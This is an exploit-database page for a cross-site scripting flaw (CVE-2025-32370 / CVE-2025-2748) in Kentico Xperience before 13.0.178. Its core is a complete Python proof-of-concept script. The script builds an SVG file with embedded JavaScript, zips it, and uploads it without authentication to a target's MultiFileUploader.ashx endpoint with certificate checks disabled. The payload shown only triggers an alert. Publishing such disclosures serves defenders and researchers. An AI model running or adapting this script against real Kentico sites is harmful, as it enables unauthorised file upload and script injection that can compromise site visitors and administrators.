---
title: Kentico Xperience 13.0.178 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2025060016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-16
fetch_date: 2025-10-06T22:52:07.905931
---

# Kentico Xperience 13.0.178 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Kentico Xperience 13.0.178 Cross Site Scripting** **2025.06.15**  Credit:  **[Alex Messham](https://cxsecurity.com/author/Alex%2BMessham/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-32370](https://cxsecurity.com/cveshow/CVE-2025-32370/ "Click to see CVE-2025-32370")** | **[CVE-2025-2748](https://cxsecurity.com/cveshow/CVE-2025-2748/ "Click to see CVE-2025-2748")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Kentico Xperience 13.0.178 - Cross Site Scripting (XSS)
# Date: 2025-05-09
# Version: Kentico Xperience before 13.0.178
# Exploit Author: Alex Messham
# Contact: ramessham@gmail.com
# Source: https://github.com/xirtam2669/Kentico-Xperience-before-13.0.178---XSS-POC/
# CVE: CVE-2025-32370
import requests
import subprocess
import os
import argparse
def create\_svg\_payload(svg\_filename: str):
print(f"[\*] Writing malicious SVG to: {svg\_filename}")
svg\_payload = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full"
xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
'''
with open(svg\_filename, 'w') as f:
f.write(svg\_payload)
def zip\_payload(svg\_filename: str, zip\_filename: str):
print(f"[\*] Creating zip archive: {zip\_filename}")
subprocess.run(['zip', zip\_filename, svg\_filename], check=True)
def upload\_zip(zip\_filename: str, target\_url: str):
full\_url = f"{target\_url}?Filename={zip\_filename}&Complete=false"
headers = {
"Content-Type": "application/octet-stream"
}
print(f"[+] Uploading {zip\_filename} to {full\_url}")
with open(zip\_filename, 'rb') as f:
response = requests.post(full\_url, headers=headers, data=f,
verify=False)
if response.status\_code == 200:
print("[+] Upload succeeded")
else:
print(f"[-] Upload failed with status code {response.status\_code}")
print(response.text)
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description="PoC for CVE-2025-2748 -
Unauthenticated ZIP file upload with embedded SVG for XSS.")
parser.add\_argument("--url", required=True, help="Target upload URL
(e.g. https://example.com/CMSModules/.../MultiFileUploader.ashx)")
parser.add\_argument("--svg", default="poc.svc", help="SVG filename to
embed inside the zip")
parser.add\_argument("--zip", default="exploit.zip", help="Name of the
output zip file")
args = parser.parse\_args()
create\_svg\_payload(args.svg)
zip\_payload(args.svg, args.zip)
upload\_zip(args.zip, args.url)
```

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top